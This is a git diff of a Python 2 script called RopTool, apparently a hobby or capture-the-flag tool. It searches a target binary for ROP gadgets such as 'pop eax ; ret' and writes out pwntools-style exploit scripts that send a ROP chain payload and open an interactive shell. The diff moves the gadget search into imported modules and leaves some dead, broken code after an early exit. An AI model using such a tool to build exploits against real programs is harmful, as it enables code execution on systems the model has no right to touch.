@@ -1,8 +1,9 @@
 #!/usr/bin/env python
 import argparse
 import sys
-import re
-from gadgetsFinder import *
+from Gadget import *
+from RopChainer import *
+from ScriptMaker import *
 
 parser = argparse.ArgumentParser(description="RopTool is use to find rop gadgets and make rop chain")
 
@@ -11,76 +12,24 @@ parser.add_argument("target", nargs="?", type=str, help="Target file")
 args = parser.parse_args()
 target = args.target
 
-class RopChainer(object):
-    def __init__(self, gadgets):
-        #gadgets.reverse()
-        self.__gadgets = gadgets
-
-    def searchSinglePopGadgets(self, pattern):
-        gadgets = []
-
-        for g in self.__gadgets:
-            codes = g["gadgets"].split(" ; ")
-
-            if len(codes) != 2 or codes[-1] != "ret":
-                continue
-
-            if re.search(pattern, codes[-2]):
-                    print "0x%08x : %s" % (g["vaddr"], g["gadgets"])
-                    gadgets += [ { "vaddr":g["vaddr"], "gadgets": g["gadgets"]} ]
-
-        return gadgets
-
-    def searchPopGadgets(self, opcode, reg="e[abcd]x"):
-        pattern = opcode + " " + "e[abcd]x"
-        gadgets = []
-
-        for g in self.__gadgets:
-            codes = g["gadgets"].split(" ; ")
-
-            if codes[-1] != "ret" or len(codes) <= 2:
-                continue
-
-            allPop = True
-            for c in codes[:-1]:
-                if re.search(pattern, c) is None:
-                    allPop = False
-                    break
-
-            if allPop:
-                print "0x%08x : %s" % (g["vaddr"], g["gadgets"])
-                gadgets += [ { "vaddr": g["vaddr"], "gadgets":g["gadgets"] } ]
-
-        return gadgets
-
 
 if target is None:
     parser.print_help()
     sys.exit(0)
 
-finder = GadgetFinder(target)
-#finder.showGadgets()
 
-gadgets = finder.getGadgets()
+gadget = Gadget(target)
+s = ScriptMaker(gadget)
+s.prepare_script()
+s.prepare_gadgets()
+s.prepare_chain()
+s.make_script()
+import sys
+sys.exit(0)
+
+
+gadgets = gadgets.getGadgets()
 chainer = RopChainer(gadgets)
-print "search single pattern"
-pop_eax = chainer.searchSinglePopGadgets("pop eax")
-pop_ebx = chainer.searchSinglePopGadgets("pop ebx")
-pop_ecx = chainer.searchSinglePopGadgets("pop ecx")
-pop_edx = chainer.searchSinglePopGadgets("pop edx")
-xor_eax = chainer.searchSinglePopGadgets("xor eax")
-xor_ebx = chainer.searchSinglePopGadgets("xor ebx")
-xor_ecx = chainer.searchSinglePopGadgets("xor ecx")
-xor_edx = chainer.searchSinglePopGadgets("xor edx")
-inc_eax = chainer.searchSinglePopGadgets("inc eax")
-inc_ebx = chainer.searchSinglePopGadgets("inc ebx")
-inc_ecx = chainer.searchSinglePopGadgets("inc ecx")
-inc_edx = chainer.searchSinglePopGadgets("inc edx")
-print
-print "search multi pattern"
-all_pop = chainer.searchPopGadgets("pop")
-all_inc = chainer.searchPopGadgets("inc")
-all_xor = chainer.searchPopGadgets("xor")
 
 tab = "    "
 sh_addr = "0xf6ffee64"
@@ -104,7 +53,7 @@ exploit += "r.sendline(payload)" + "\n"
 exploit += "r.interactive()" + "\n"
 exploit += "r.close()" + "\n"
 
-
+"""
 if pop_eax and pop_ebx and pop_ecx and pop_edx:
     print "do"
     for i in range(10):
@@ -123,6 +72,7 @@ if pop_eax and pop_ebx and pop_ecx and pop_edx:
             f.write(header)
             f.write(chain)
             f.write(exploit)
+"""
 
 c = 1
 for pops in all_pop:
@@ -151,4 +101,6 @@ for pops in all_pop:
         f.write(chain)
         f.write(exploit)
         c += 1
+    if c>1:
+        break
 
